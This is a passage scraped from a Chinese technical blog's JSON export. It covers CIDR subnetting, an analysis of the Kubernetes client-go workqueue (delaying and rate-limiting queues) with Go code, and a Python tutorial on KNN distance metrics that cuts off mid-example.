192.168.0.7\u0026hellip;192.168.0.248 ~ 192.168.0.251192.168.0.252 ~ 192.168.0.255 $2^n - 2=4-2=2$ 4 /31255.255.255.1111111 | 0255.255.255.254 作为网段是无效的，一个网络地址和一个广播地址，剩余可用IP数量为0，但是作为IP段这个段有两个IP地址，一般指当前位数与后一位的IP如：\n192.168.0.1/31 即代表\n192.168.0.1 192.168.0.2 $2^n - 2=2-2=0$ 2 /32255.255.255.11111111255.255.255.255 作为网段是无效的，网络地址和广播地址都不够分配，但是作为IP段这个段有两个IP地址，一般指当前IP本身，如：192.168.0.1/32 即代表192.168.0.1 1 CIDR [1] 无类别域间路由 Classless Inter-Domain Routing，是一个按位的、基于前缀的，用于解释IP地址的标准。通俗来讲是通过把多个地址块组合到一个路由表表项而使得路由更加方便。\n例如，指定一个CIDR块为10.10.1.32/27，则根据CIDR比特位比较，10.10.1.44是属于该块，但10.10.1.90则不是，如下图所示：\n图：CIDR块 Source：https://zh.wikipedia.org/zh-cn/%E6%97%A0%E7%B1%BB%E5%88%AB%E5%9F%9F%E9%97%B4%E8%B7%AF%E7%94%B1 那么这个IP地址表计算方式为：$2^n-2 = 32-2=30$，10.10.1.33 ~ 10.10.1.62 其中网络地址（主机位全为0 10.10.1.32, 10.10.1.111| 00000 ）和广播地址（主机位全为1 10.10.1.63，10.10.1.111| 10000 ）不能分配计算机主机。\nCIDR与VLSM的区别 CIDR 是把几个标准网络合成一个大的网络\nVLSM 是把一个标准网络分成几个小型网络(子网)\nCIDR 是子网掩码往左边移了，VLSM 是子网掩码往右边移了\nReference [1] CIDR\n","permalink":"https://www.oomkill.com/2022/06/osi-network-basics/","summary":"","title":"OSI模型与IP协议"},{"content":"通用队列 在kubernetes中，使用go的channel无法满足kubernetes的应用场景，如延迟、限速等；在kubernetes中存在三种队列通用队列 common queue ，延迟队列 delaying queue，和限速队列 rate limiters queue\nInferface Interface作为所有队列的一个抽象定义\ntype Interface interface { Add(item interface{}) Len() int Get() (item interface{}, shutdown bool) Done(item interface{}) ShutDown() ShuttingDown() bool } Implementation type Type struct { // 一个work queue queue []t // queue用slice做存储 dirty set // 脏位，定义了需要处理的元素，类似于操作系统，表示已修改但为写入 processing set // 当前正在处理的元素集合 cond *sync.Cond shuttingDown bool metrics queueMetrics unfinishedWorkUpdatePeriod time.Duration clock clock.Clock } type empty struct{} type t interface{} // t queue中的元素 type set map[t]empty // dirty 和 processing中的元素 可以看到其中核心属性就是 queue , dirty , processing\n延迟队列 在研究优先级队列前，需要对 Heap 有一定的了解，因为delay queue使用了 heap 做延迟队列\nHeap Heap 是基于树属性的特殊数据结构；heap是一种完全二叉树类型，具有两种类型：\n如：B 是 A 的子节点，则 $key(A) \\geq key(B)$ 。这就意味着具有最大Key的元素始终位于根节点，这类Heap称为最大堆 MaxHeap。 父节点的值小于或等于其左右子节点的值叫做 MinHeap 二叉堆的存储规则：\n每个节点包含的元素大于或等于该节点子节点的元素。 树是完全二叉树。 那么下列图片中，那个是堆\nheap的实现\n实例：向左边添加一个值为42的元素的过程 步骤一：将新元素放入堆中的第一个可用位置。这将使结构保持为完整的二叉树，但它可能不再是堆，因为新元素可能具有比其父元素更大的值。\n步骤二：如果新元素的值大于父元素，将新元素与父元素交换，直到达到新元素到根，或者新元素大于等于其父元素的值时将停止\n这种过程被称为 向上调整 （reheapification upward）\n实例：移除根 步骤一：将根元素复制到用于返回值的变量中，将最深层的最后一个元素复制到根，然后将最后一个节点从树中取出。该元素称为 out-of-place 。\n步骤二：而将异位元素与其最大值的子元素交换，并返回在步骤1中保存的值。\n这个过程被称为向下调整 （reheapification downward）\n优先级队列 优先级队列的行为：\n元素被放置在队列中，然后被取出。 优先级队列中的每个元素都有一个关联的数字，称为优先级。 当元素离开优先级队列时，最高优先级的元素最先离开。 如何实现的：\n在优先级队列中，heap的每个节点都包含一个元素以及元素的优先级，并且维护树以便它遵循使用元素的优先级来比较节点的堆存储规则：\n每个节点包含的元素的优先级大于或等于该节点子元素的优先级。 树是完全二叉树。 实现的代码：golang priorityQueue\nReference\nheap\nClient-go 的延迟队列 在Kubernetes中对 delaying queue 的设计非常精美，通过使用 heap 实现的延迟队列，加上kubernetes中的通过队列，完成了延迟队列的功能。\n// 注释中给了一个hot-loop热循环，通过这个loop实现了delaying type DelayingInterface interface { Interface // 继承了workqueue的功能 AddAfter(item interface{}, duration time.Duration) // 在time后将内容添加到工作队列中 } 具体实现了 DelayingInterface 的实例\ntype delayingType struct { Interface // 通用的queue clock clock.Clock // 对比的时间 ，包含一些定时器的功能 type Clock interface { PassiveClock type PassiveClock interface { Now() time.Time Since(time.Time) time.Duration } After(time.Duration) \u0026lt;-chan time.Time NewTimer(time.Duration) Timer Sleep(time.Duration) NewTicker(time.Duration) Ticker } stopCh chan struct{} // 停止loop stopOnce sync.Once // 保证退出只会触发一次 heartbeat clock.Ticker // 一个定时器，保证了loop的最大空事件等待时间 waitingForAddCh chan *waitFor // 普通的chan，用来接收数据插入到延迟队列中 metrics retryMetrics // 重试的指数 } 那么延迟队列的整个数据结构如下图所示\n而上面部分也说到了，这个延迟队列的核心就是一个优先级队列，而优先级队列又需要满足：\n优先级队列中的每个元素都有一个关联的数字，称为优先级。 当元素离开优先级队列时，最高优先级的元素最先离开。 而 waitFor 就是这个优先级队列的数据结构\ntype waitFor struct { data t // 数据 readyAt time.Time // 加入工作队列的时间 index int // 优先级队列中的索引 } 而 waitForPriorityQueue 是对 container/heap/heap.go.Inferface 的实现，其数据结构就是使最小 readyAt 位于Root 的一个 MinHeap\ntype Interface interface { sort.Interface Push(x interface{}) // add x as element Len() Pop() interface{} // remove and return element Len() - 1. } 而这个的实现是 waitForPriorityQueue\ntype waitForPriorityQueue []*waitFor func (pq waitForPriorityQueue) Len() int { return len(pq) } // 这个也是最重要的一个，就是哪个属性是排序的关键，也是heap.down和heap.up中使用的 func (pq waitForPriorityQueue) Less(i, j int) bool { return pq[i].readyAt.Before(pq[j].readyAt) } func (pq waitForPriorityQueue) Swap(i, j int) { pq[i], pq[j] = pq[j], pq[i] pq[i].index = i pq[j].index = j } // push 和pop 必须使用heap.push 和heap.pop func (pq *waitForPriorityQueue) Push(x interface{}) { n := len(*pq) item := x.(*waitFor) item.index = n *pq = append(*pq, item) } func (pq *waitForPriorityQueue) Pop() interface{} { n := len(*pq) item := (*pq)[n-1] item.index = -1 *pq = (*pq)[0:(n - 1)] return item } // Peek returns the item at the beginning of the queue, without removing the // item or otherwise mutating the queue. It is safe to call directly. func (pq waitForPriorityQueue) Peek() interface{} { return pq[0] } 而整个延迟队列的核心就是 waitingLoop，作为了延迟队列的主要逻辑，检查 waitingForAddCh 有没有要延迟的内容，取出延迟的内容放置到 Heap 中；以及保证最大的阻塞周期\nfunc (q *delayingType) waitingLoop() { defer utilruntime.HandleCrash() never := make(\u0026lt;-chan time.Time) // 作为占位符 var nextReadyAtTimer clock.Timer // 最近一个任务要执行的定时器 waitingForQueue := \u0026amp;waitForPriorityQueue{} // 优先级队列，heap heap.Init(waitingForQueue) waitingEntryByData := map[t]*waitFor{} // 检查是否反复添加 for { if q.Interface.ShuttingDown() { return } now := q.clock.Now() for waitingForQueue.Len() \u0026gt; 0 { entry := waitingForQueue.Peek().(*waitFor) if entry.readyAt.After(now) { break // 时间没到则不处理 } entry = heap.Pop(waitingForQueue).(*waitFor) // 从优先级队列中取出一个 q.Add(entry.data) // 添加到延迟队列中 delete(waitingEntryByData, entry.data) // 删除map表中的数据 } // 如果存在数据则设置最近一个内容要执行的定时器 nextReadyAt := never if waitingForQueue.Len() \u0026gt; 0 { if nextReadyAtTimer != nil { nextReadyAtTimer.Stop() } entry := waitingForQueue.Peek().(*waitFor) // 窥视[0]和值 nextReadyAtTimer = q.clock.NewTimer(entry.readyAt.Sub(now)) // 创建一个定时器 nextReadyAt = nextReadyAtTimer.C() } select { case \u0026lt;-q.stopCh: // 退出 return case \u0026lt;-q.heartbeat.C(): // 多久没有任何动作时重新一次循环 case \u0026lt;-nextReadyAt: // 如果有元素时间到了，则继续执行循环，处理上面添加的操作 case waitEntry := \u0026lt;-q.waitingForAddCh: if waitEntry.readyAt.After(q.clock.Now()) { // 时间没到，是用readyAt和now对比time.Now // 添加到延迟队列中，有两个 waitingEntryByData waitingForQueue insert(waitingForQueue, waitingEntryByData, waitEntry) } else { q.Add(waitEntry.data) } drained := false // 保证可以取完q.waitingForAddCh // addafter for !drained { select { // 这里是一个有buffer的队列，需要保障这个队列读完 case waitEntry := \u0026lt;-q.waitingForAddCh: if waitEntry.readyAt.After(q.clock.Now()) { insert(waitingForQueue, waitingEntryByData, waitEntry) } else { q.Add(waitEntry.data) } default: // 保证可以退出，但限制于上一个分支的0~n的读取 // 如果上一个分支阻塞，则为没有数据就是取尽了，走到这个分支 // 如果上个分支不阻塞则读取到上个分支阻塞为止，代表阻塞，则走default退出 drained = true } } } } } 限速队列 限速队列 RateLimiting 是在优先级队列是在延迟队列的基础上进行扩展的一个队列\ntype RateLimitingInterface interface { DelayingInterface // 继承延迟队列 // 在限速器准备完成后（即合规后）添加条目到队列中 AddRateLimited(item interface{}) // drop掉条目，无论成功或失败 Forget(item interface{}) // 被重新放入队列中的次数 NumRequeues(item interface{}) int } 可以看到一个限速队列的抽象对应只要满足了 AddRateLimited() , Forget() , NumRequeues() 的延迟队列都是限速队列。看了解规则之后，需要对具体的实现进行分析。\ntype rateLimitingType struct { DelayingInterface rateLimiter RateLimiter } func (q *rateLimitingType) AddRateLimited(item interface{}) { q.DelayingInterface.AddAfter(item, q.rateLimiter.When(item)) } func (q *rateLimitingType) NumRequeues(item interface{}) int { return q.rateLimiter.NumRequeues(item) } func (q *rateLimitingType) Forget(item interface{}) { q.rateLimiter.Forget(item) } rateLimitingType 则是对抽象规范 RateLimitingInterface 的实现，可以看出是在延迟队列的基础上增加了一个限速器 RateLimiter\ntype RateLimiter interface { // when决定等待多长时间 When(item interface{}) time.Duration // drop掉item // or for success, we'll stop tracking it Forget(item interface{}) // 重新加入队列中的次数 NumRequeues(item interface{}) int } 抽象限速器的实现，有 BucketRateLimiter , ItemBucketRateLimiter , ItemExponentialFailureRateLimiter , ItemFastSlowRateLimiter , MaxOfRateLimiter ，下面对这些限速器进行分析\nBucketRateLimiter BucketRateLimiter 是实现 rate.Limiter 与 抽象 RateLimiter 的一个令牌桶，初始化时通过 workqueue.DefaultControllerRateLimiter() 进行初始化。\nfunc DefaultControllerRateLimiter() RateLimiter { return NewMaxOfRateLimiter( NewItemExponentialFailureRateLimiter(5*time.Millisecond, 1000*time.Second), // 10 qps, 100 bucket size. This is only for retry speed and its only the overall factor (not per item) \u0026amp;BucketRateLimiter{Limiter: rate.NewLimiter(rate.Limit(10), 100)}, ) } 更多关于令牌桶算法可以参考这里\nItemBucketRateLimiter ItemBucketRateLimiter 是作为列表存储每个令牌桶的实现，每个key都是单独的限速器\ntype ItemBucketRateLimiter struct { r rate.Limit burst int limitersLock sync.Mutex limiters map[interface{}]*rate.Limiter } func NewItemBucketRateLimiter(r rate.Limit, burst int) *ItemBucketRateLimiter { return \u0026amp;ItemBucketRateLimiter{ r: r, burst: burst, limiters: make(map[interface{}]*rate.Limiter), } } ItemExponentialFailureRateLimiter 如名所知 ItemExponentialFailureRateLimiter 限速器是一个错误指数限速器，根据错误的次数，将指数用于delay的时长，指数的计算公式为：$baseDelay\\times2^{}$。 可以看出When绝定了流量整形的delay时间，根据错误次数为指数进行延长重试时间\ntype ItemExponentialFailureRateLimiter struct { failuresLock sync.Mutex failures map[interface{}]int // 失败的次数 baseDelay time.Duration // 延迟基数 maxDelay time.Duration // 最大延迟 } func (r *ItemExponentialFailureRateLimiter) When(item interface{}) time.Duration { r.failuresLock.Lock() defer r.failuresLock.Unlock() exp := r.failures[item] r.failures[item] = r.failures[item] + 1 // The backoff is capped such that 'calculated' value never overflows. backoff := float64(r.baseDelay.Nanoseconds()) * math.Pow(2, float64(exp)) if backoff \u0026gt; math.MaxInt64 { return r.maxDelay } calculated := time.Duration(backoff) if calculated \u0026gt; r.maxDelay { return r.maxDelay } return calculated } func (r *ItemExponentialFailureRateLimiter) NumRequeues(item interface{}) int { r.failuresLock.Lock() defer r.failuresLock.Unlock() return r.failures[item] } func (r *ItemExponentialFailureRateLimiter) Forget(item interface{}) { r.failuresLock.Lock() defer r.failuresLock.Unlock() delete(r.failures, item) } ItemFastSlowRateLimiter ItemFastSlowRateLimiter ，限速器先快速重试一定次数，然后慢速重试\ntype ItemFastSlowRateLimiter struct { failuresLock sync.Mutex failures map[interface{}]int maxFastAttempts int // 最大尝试次数 fastDelay time.Duration // 快的速度 slowDelay time.Duration // 慢的速度 } func NewItemFastSlowRateLimiter(fastDelay, slowDelay time.Duration, maxFastAttempts int) RateLimiter { return \u0026amp;ItemFastSlowRateLimiter{ failures: map[interface{}]int{}, fastDelay: fastDelay, slowDelay: slowDelay, maxFastAttempts: maxFastAttempts, } } func (r *ItemFastSlowRateLimiter) When(item interface{}) time.Duration { r.failuresLock.Lock() defer r.failuresLock.Unlock() r.failures[item] = r.failures[item] + 1 // 当错误次数没超过快速的阈值使用快速，否则使用慢速 if r.failures[item] \u0026lt;= r.maxFastAttempts { return r.fastDelay } return r.slowDelay } func (r *ItemFastSlowRateLimiter) NumRequeues(item interface{}) int { r.failuresLock.Lock() defer r.failuresLock.Unlock() return r.failures[item] } func (r *ItemFastSlowRateLimiter) Forget(item interface{}) { r.failuresLock.Lock() defer r.failuresLock.Unlock() delete(r.failures, item) } MaxOfRateLimiter MaxOfRateLimiter 是返回限速器列表中，延迟最大的那个限速器\ntype MaxOfRateLimiter struct { limiters []RateLimiter } func (r *MaxOfRateLimiter) When(item interface{}) time.Duration { ret := time.Duration(0) for _, limiter := range r.limiters { curr := limiter.When(item) if curr \u0026gt; ret { ret = curr } } return ret } func NewMaxOfRateLimiter(limiters ...RateLimiter) RateLimiter { return \u0026amp;MaxOfRateLimiter{limiters: limiters} } func (r *MaxOfRateLimiter) NumRequeues(item interface{}) int { ret := 0 // 找到列表內所有的NumRequeues（失败的次数），以最多次的为主。 for _, limiter := range r.limiters { curr := limiter.NumRequeues(item) if curr \u0026gt; ret { ret = curr } } return ret } func (r *MaxOfRateLimiter) Forget(item interface{}) { for _, limiter := range r.limiters { limiter.Forget(item) } } 如何使用Kubernetes的限速器 基于流量管制的限速队列实例，可以大量突发，但是需要进行整形，添加操作会根据 When() 中设计的需要等待的时间进行添加。根据不同的队列实现不同方式的延迟\npackage main import ( \u0026quot;fmt\u0026quot; \u0026quot;log\u0026quot; \u0026quot;strconv\u0026quot; \u0026quot;time\u0026quot; \u0026quot;k8s.io/client-go/util/workqueue\u0026quot; ) func main() { stopCh := make(chan string) timeLayout := \u0026quot;2006-01-02:15:04:05.0000\u0026quot; limiter := workqueue.NewRateLimitingQueue(workqueue.DefaultControllerRateLimiter()) length := 20 // 一共请求20次 chs := make([]chan string, length) for i := 0; i \u0026lt; length; i++ { chs[i] = make(chan string, 1) go func(taskId string, ch chan string) { item := \u0026quot;Task-\u0026quot; + taskId + time.Now().Format(timeLayout) log.Println(item + \u0026quot; Added.\u0026quot;) limiter.AddRateLimited(item) // 添加会根据When() 延迟添加到工作队列中 }(strconv.FormatInt(int64(i), 10), chs[i]) go func() { for { key, quit := limiter.Get() if quit { return } log.Println(fmt.Sprintf(\u0026quot;%s process done\u0026quot;, key)) defer limiter.Done(key) } }() } \u0026lt;-stopCh } 因为默认的限速器不支持初始化 QPS，修改源码内的为 $BT(1, 5)$ ，执行结果可以看出，大突发流量时，超过桶内token数时，会根据token生成的速度进行放行。\n图中，任务的添加是突发性的，日志打印的是同时添加，但是在添加前输出的日志，消费端可以看到实际是被延迟了。配置的是每秒一个token，实际上放行流量也是每秒一个token。\n","permalink":"https://www.oomkill.com/2022/06/ch09-queue/","summary":"","title":"源码分析client-go架构 - queue"},{"content":"Overview K近邻值算法 KNN (K — Nearest Neighbors) 是一种机器学习中的分类算法；K-NN是一种非参数的惰性学习算法。非参数意味着没有对基础数据分布的假设，即模型结构是从数据集确定的。\n它被称为惰性算法的原因是，因为它**不需要任何训练数据点来生成模型。**所有训练数据都用于测试阶段，这使得训练更快，测试阶段更慢且成本更高。\n如何工作 KNN 算法是通过计算新对象与训练数据集中所有对象之间的距离，对新实例进行分类或回归预测。然后选择训练数据集中距离最小的 K 个示例，并通过平均结果进行预测。\n如图所示：一个未分类的数据（红色）和所有其他已分类的数据（黄色和紫色），每个数据都属于一个类别。因此，计算未分类数据与所有其他数据的距离，以了解哪些距离最小，因此当K= 3 （或K= 6 ）最接近的数据并检查出现最多的类，如下图所示，与新数据最接近的数据是在第一个圆圈内（圆圈内）的数据，在这个圆圈内还有 3 个其他数据（已经用黄色分类），我们将检查其中的主要类别，会被归类为紫色，因为有2个紫色球，1个黄色球。\nKNN算法要执行的步骤 将数据分为训练数据和测试数据 选择一个值 K 确定要使用的距离算法 从需要分类的测试数据中选择一个样本，计算到它的 n 个训练样本的距离。 对获得的距离进行排序并取 k最近的数据样本。 根据 k 个邻居的多数票将测试类分配给该类。 影响KNN算法性能的因素 用于确定最近邻居的距离的算法\n用于从 K 近邻派生分类的决策规则\n用于对新示例进行分类的邻居数\n如何计算距离 测量距离是KNN算法的核心，总结了问题域中两个对象之间的相对差异。比较常见的是，这两个对象是描述主题（例如人、汽车或房屋）或事件（例如购买、索赔或诊断）的数据行。\n汉明距离 汉明距离（Hamming Distance）计算两个二进制向量之间的距离，也简称为二进制串 binary strings 或位串 bitstrings ；换句话说，汉明距离是将一个字符串更改为另一个字符串所需的最小替换次数，或将一个字符串转换为另一个字符串的最小错误数。\n示例：如一列具有类别 “红色”、“绿色” 和 “蓝色”，您可以将每个示例独热编码为一个位串，每列一个位。\n注：独热编码 one-hot encoding：将分类数据，转换成二进制向量表示，这个二进制向量用来表示一种特殊的bit（二进制位）组合，该字节里，仅容许单一bit为1，其他bit都必须为0\n如：\napple banana pineapple 1 0 0 0 1 0 0 0 1 100 表示苹果，100就是苹果的二进制向量 010 表示香蕉，010就是香蕉的二进制向量\nred = [1, 0, 0] green = [0, 1, 0] blue = [0, 0, 1] 而red和green之间的距离就是两个等长bitstrings之间bit差（对应符号不同的位置）的总和或平均数，这就是汉明距离\n$Hamming Distance d(a, b)\\ =\\ sum(xi\\ !=\\ yi\\ for\\ xi,\\ yi\\ in\\ zip(x, y))$ 上述的实现为：\ndef hammingDistance(a, b): if len(a) != len(b): raise ValueError(\u0026quot;Undefined for sequences of unequal length.\u0026quot;) return sum(abs(e1 - e2) for e1, e2 in zip(a, b)) row1 = [0, 0, 0, 0, 0, 1] row2 = [0, 0, 0, 0, 1, 0] dist = hammingDistance(row1, row2) print(dist) 可以看到字符串之间有两个差异，或者 6 个位位置中有 2 个不同，平均 (2/6) 约为 1/3 或 0.333。\nfrom scipy.spatial.distance import hamming # define data row1 = [0, 0, 0, 0, 0, 1] row2 = [0, 0, 0, 0, 1, 0] # calculate distance dist = hamming(row1, row2) print(dist) 欧几里得距离 欧几里得距离（Euclidean distance） 是计算两个点之间的距离。在计算具体的数值（例如浮点数或整数）的两行数据之间的距离时，您最有可能使用欧几里得距离。\n欧几里得距离计算公式为两个向量之间的平方差之和的平方根。\n$EuclideanDistance=\\sqrt[]{\\sum(a-b)^2}$\n如果要执行数千或数百万次距离计算，通常会去除平方根运算以加快计算速度。修改后的结果分数将具有相同的相对比例，并且仍然可以在机器学习算法中有效地用于查找最相似的示例。\n$EuclideanDistance = sum\\ for\\ i\\ to\\ N\\ (v1[i]\\ –\\ v2[i])^2$\n# calculating euclidean distance between vectors from math import sqrt from scipy.spatial.distance import euclidean # calculate euclidean distance def euclidean_distance(a, b): return sqrt(sum((e1-e2)**2 for e1, e2 in zip(a,b))) # define data row1 = [10, 20, 15, 10, 5] row2 = [12, 24, 18, 8, 7] # calculate distance dist = euclidean_distance(row1, row2) print(dist) print(euclidean(row1, row2)) 曼哈顿距离 曼哈顿距离（ Manhattan distance ）又被称作出租车几何学 Taxicab geometry；用于计算两个向量之间的距离。\n对于描述网格上的对象（如棋盘或城市街区）的向量可能更有用。出租车在城市街区之间采取的最短路径（网格上的坐标）。\n粗略地说，欧几里得几何是中学常用的平面几何和立体几何 Plane geometry\n曼哈顿距离可以理解为：欧几里得空间的固定直角坐标系上两点所形成的线段对轴产生的投影的距离总和。\n图中： 红、蓝与黄线分别表示所有曼哈顿距离都拥有一样长度（12），绿线表示欧几里得距离 $6×\\sqrt2 ≈ 8.48$\n对于整数特征空间中的两个向量，应该计算曼哈顿距离而不是欧几里得距离\n曼哈顿距离在二维平面的计算公式是，在X轴的亮点\n$Manhattandistance\\ d(x,y)=\\left|x_{1}-x_{2}\\right|+\\left|y_{1}-y_{2}\\right|$\n如果所示，描述格子和格子之间的距离可以用曼哈顿距离，如国王移动到右下角的距离是？\n$King=|6-8|+|6-1| = 7$\n两个向量间的距离可以表示为 $MD\\ =\\ Σ|Ai – Bi|$\npython中的公式可以表示为 ：sum(abs(val1-val2) for val1, val2 in zip(a,b))\nfrom scipy.spatial.distance import cityblock # calculate manhattan distance def manhattan_distance(a, b): return sum(abs(e1-e2) for e1, e2 in zip(a,b)) # define data row1 = [10, 20, 15, 10, 5] row2 = [12, 24, 18, 8, 7] # calculate distance dist = manhattan_distance(row1, row2) print(dist) print(cityblock(row1, row2)) 闵可夫斯基距离 闵可夫斯基距离（Minkowski distance）并不是一种距离而是对是欧几里得距离和曼哈顿距离的概括，用来计算两个向量之间的距离。\n闵可夫斯基增并添加了一个参数，称为“阶数”或 p：$d(x,y) = (\\sum(|x-y|)^p)^\\frac{1}{p}$\n在python中的公式：\n(sum for i to N (abs(v1[i] – v2[i]))^p)^(1/p) p 是一个有序的参数，当 $p=1$ 时，计算的是曼哈顿距离。当 $p=2$ 时，计算的是欧几里得距离。\n在实现使用距离度量的机器学习算法时，通常会使用闵可夫斯基距离，因为可以通过调整参数“ p ”控制用于向量的距离度量算法的类型。\n# calculating minkowski distance between vectors from scipy.spatial import minkowski_distance # calculate minkowski distance def minkowski_distance(a, b, p): return sum(abs(e1-e2)**p for e1, e2 in zip(a,b))**(1/p) # define data row1 = [10, 20, 15, 10, 5] row2 = [12, 24, 18, 8, 7] # 手动实现的算法用来使用闵可夫斯基计算距离 dist = minkowski_distance(row1, row2, 1) # 1为曼哈顿 print(dist) # 1为欧几里得 dist = minkowski_distance(row1, row2, 2) print(dist) # 使用包 scipy.spatial来计算 print(minkowski_distance(row1, row2, 1)) print(minkowski_distance(row1, row2, 2)) KNN算法实现 Prerequisite 首先会用示例来实现KNN算法的每个步骤，并加以分析，然后将所有步骤关联在在一起，形成一个适用于真实数据集的实现。\nKNN在实现起来主要有三个步骤：\n计算距离（这里选择欧几里得距离） 获得临近邻居 做出预测 这三个步骤是KNN算法用以解决分类和回归预测建模问题的基础知识\n计算距离 第一步计算数据集中两行之间的距离。在数据集中的数据行主要由数字组成，计算两行或数字向量之间的距离的一种简单方法是画一条直线。这在 2D 或 3D 平面中都是很好地选择，并且可以很好地扩展到更高的维度。\n这里使用的是比较流行的计算距离的算法，欧几里得距离来计算两个向量之间的直线距离。欧几里得距离的公式是，两个向量的平方差的平方根，$Euclidean\\ Distance=\\sqrt[]{\\sum(a-b)^2}$ ；在python中可以表示为：sqrt(sum i to N (x1 – x2)^2) ；其中 x1 是第一行数据，x2 是第二行数据，i 表示特定列的索引，因为可能需要对所有行进行计算。\n在欧几里得距离中，值越小，两条记录就越相似； 0 表示两条记录之间没有差异。\n那么使用python实现一个计算欧几里得距离的算法\ndef euclidean_distance(row1, row2): distance = 0.0 for i in range(len(row1)-1): distance += (row1[i] - row2[i])**2 return sqrt(distance) 准备一部分测试数据，来对测试距离算法\nX1\tX2\tY 2.7810836\t2.550537003\t0 1.465489372\t2.362125076\t0 3.396561688\t4.400293529\t0 1.38807019\t1.850220317\t0 3.06407232\t3.005305973\t0 7.627531214\t2.759262235\t1 5.332441248\t2.088626775\t1 6.922596716\t1.77106367\t1 8.675418651\t-0.242068655\t1 7.673756466\t3.508563011\t1 那么来测试这些数据，需要做到的是第一行与所有行之间的距离，对于第一行与自己的距离应该为0\nfrom math import sqrt # 欧几里得距离，计算两个向量间距离的算法 def euclidean_distance(row1, row2): distance = 0.0 for i in range(len(row1)-1): distance += (row1[i] - row2[i])**2 # 平方差 return sqrt(distance) # 平方根 # 测试数据集 dataset = [ [2.7810836,2.550537003,0], [1.465489372,2.362125076,0], [3.396561688,4.400293529,0], [1.38807019,1.850220317,0], [3.06407232,3.005305973,0], [7.627531214,2.759262235,1], [5.332441248,2.088626775,1], [6.922596716,1.77106367,1], [8.675418651,-0.242068655,1], [7.673756466,3.508563011,1] ] row0 = dataset[0] for row in dataset: distance = euclidean_distance(row0, row) print(distance) # 0.0 # 1.3290173915275787 # 1.9494646655653247 # 1.5591439385540549 # 0.5356280721938492 # 4.850940186986411 # 2.592833759950511 # 4.214227042632867 # 6.522409988228337 # 4.985585382449795 获取最近邻居 数据集中新数据的邻居是k个最接近的实例（行），这个实例由距离定义。现在诞生的问题：如何找到最近的邻居？以及怎么找到最近的邻居？\n为了在数据集中找到 K 的邻居，首先必须计算数据集中每条记录与新数据之间的距离。\n有了距离之后，必须按照 K 的距离对训练集中的所有实例排序。然后选择前 k 个作为最近的邻居。\n这里实现起来是通过将数据集中每条记录的距离作为一个元组来跟踪，通过对元组列表进行排序（距离降序），然后检索最近邻居。下面是一个实现这些步骤的函数\n# 找到最近的邻居 def get_neighbors(train, test_row, num_neighbors): \u0026quot;\u0026quot;\u0026quot; 计算训练集train中所有元素到test_row的距离 :param train: list, 数据集，可以是训练集 :param test_row: list, 新的实例，也就是K :param num_neighbors:int，需要多少个邻居 :return: None \u0026quot;\u0026quot;\u0026quot; distances = list() for train_row in train: # 计算出每一行的距离，把他添加到元组中 dist = euclidean_distance(test_row, train_row) distances.append((train_row, dist)) distances.sort(key=lambda knn: knn[1]) # 根据元素哪个字段进行排序 neighbors = list() for i in range(num_neighbors): neighbors.append(distances[i][0]) return neighbors 下面是完整的示例\nfrom math import sqrt # 欧几里得距离，计算两个向量间距离的算法 def euclidean_distance(row1, row2): distance = 0.0 for i in range(len(row1)-1): distance += (row1[i] - row2[i])**2 # 平方差 return sqrt(distance) # 平方根 # 找到最近的邻居 def get_neighbors(train, test_row, num_neighbors): \u0026quot;\u0026quot;\u0026quot; 计算训练集train中所有元素到test_row的距离 :param train: list, 数据集，可以是训练集 :param test_row: list, 新的实例，也就是K :param num_neighbors:int，需要多少个邻居 :return: None \u0026quot;\u0026quot;\u0026quot; distances = list() for train_row in train: # 计算出每一行的距离，把他添加到元组中 dist = euclidean_distance(test_row, train_row) distances.append((train_row, dist)) distances.sort(key=lambda knn: knn[1]) # 根据元素哪个字段进行排序 neighbors = list() for i in range(num_neighbors): neighbors.append(distances[i][0]) return neighbors # 测试数据集 dataset = [ [2.7810836,2.550537003,0], [1.465489372,2.362125076,0], [3.396561688,4.400293529,0], [1.38807019,1.850220317,0], [3.06407232,3.005305973,0], [7.627531214,2.759262235,1], [5.332441248,2.088626775,1], [6.922596716,1.77106367,1], [8.675418651,-0.242068655,1], [7.673756466,3.508563011,1] ] neighbors = get_neighbors(dataset, dataset[0], 3) for neighbor in neighbors: print(neighbor) # [2.7810836, 2.550537003, 0] # [3.06407232, 3.005305973, 0] # [1.465489372, 2.362125076, 0] 可以看到，运行后会将数据集中最相似的 3 条记录按相似度顺序打印。和预测的一样，第一个记录与其本身最相似，并且位于列表的顶部。\n预测结果 预测结果在这里指定是，通过分类拿到了最近的邻居的实例，对邻居进行分类，找到邻居中最大类别的一类，作为预测值。这里使用的是对邻居值执行 max() 来实现这一点，下面是实现方式\n# 预测值 def predict_classification(train, test_row, num_neighbors): \u0026quot;\u0026quot;\u0026quot; 计算训练集train中所有元素到test_row的距离 :param train: list, 数据集，可以是训练集 :param test_row: list, 新的实例，也就是K :param num_neighbors:int，需要多少个邻居 :return: None \u0026quot;\u0026quot;\u0026quot; neighbors = get_neighbors(train, test_row, num_neighbors) output_values = [row[-1] for row in neighbors] # 拿到所属类的真实类别 prediction = max(set(output_values), key=output_values.count) #算出邻居类别最大的数量 return prediction 下面是完整的示例\nfrom math import sqrt # 欧几里得距离，计算两个向量间距离的算法 def euclidean_distance(row1, row2): distance = 0.0 for i in range(len(row1)-1): distance += (row1[i] - row2[i])**2 # 平方差 return sqrt(distance) # 平方根 # 找到最近的邻居 def get_neighbors(train, test_row, num_neighbors): \u0026quot;\u0026quot;\u0026quot; 计算训练集train中所有元素到test_row的距离 :param train: list, 数据集，可以是训练集 :param test_row: list, 新的实例，也就是K :param num_neighbors:int，需要多少个邻居 :return: None \u0026quot;\u0026quot;\u0026quot; distances = list() for train_row in train: # 计算出每一行的距离，把他添加到元组中 dist = euclidean_distance(test_row, train_row) distances.append((train_row, dist)) distances.sort(key=lambda knn: knn[1]) # 根据元素哪个字段进行排序 neighbors = list() for i in range(num_neighbors): neighbors.append(distances[i][0]) return neighbors # 预测值 def predict_classification(train, test_row, num_neighbors): \u0026quot;\u0026quot;\u0026quot; 计算训练集train中所有元素到test_row的距离 :param train: list, 数据集，可以是训练集 :param test_row: list, 新的实例，也就是K :param num_neighbors:int，需要多少个邻居 :return: None \u0026quot;\u0026quot;\u0026quot; neighbors = get_neighbors(train, test_row, num_neighbors) output_values = [row[-1] for row in neighbors] # 拿到所属类的真实类别 prediction = max(set(output_values), key=output_values.count) #算出邻居类别最大的数量 return prediction # 测试数据集 dataset = [ [2.7810836,2.550537003,0], [1.465489372,2.362125076,0], [3.396561688,4.400293529,0], [1.38807019,1.850220317,0], [3.06407232,3.005305973,0], [7.627531214,2.759262235,1], 